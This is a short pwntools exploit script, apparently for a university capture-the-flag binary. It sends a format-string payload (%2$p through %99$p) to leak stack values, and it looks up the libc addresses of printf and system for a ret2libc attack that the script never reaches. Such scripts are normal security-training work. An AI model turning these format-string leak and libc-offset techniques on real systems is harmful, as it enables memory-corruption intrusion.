from pwn import * 

p = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# p = gdb.debug(
#     "./bin",
#     """
#     break main
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"}
#     )
#p = remote('cyberchallenge.disi.unitn.it', 50230)

def little_to_big_endian(hex_str):
    # Split the string into pairs of two characters
    hex_pairs = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
    # Reverse the list of pairs
    hex_pairs.reverse()
    # Join the reversed list back into a single string
    big_endian_str = ''.join(hex_pairs)
    return big_endian_str

elf = ELF("./bin")
libc = ELF("./libc.so.6")

context.binary = elf
context(terminal=['tmux', 'splitw', '-h'])

printf_offset = libc.symbols["printf"]
system_offset = libc.symbols["system"]

out = ''
for i in range (2, 100):
    out += f'{i}=%{i}$p\n'


p.sendlineafter(b'> ', out.encode())

p.interactive()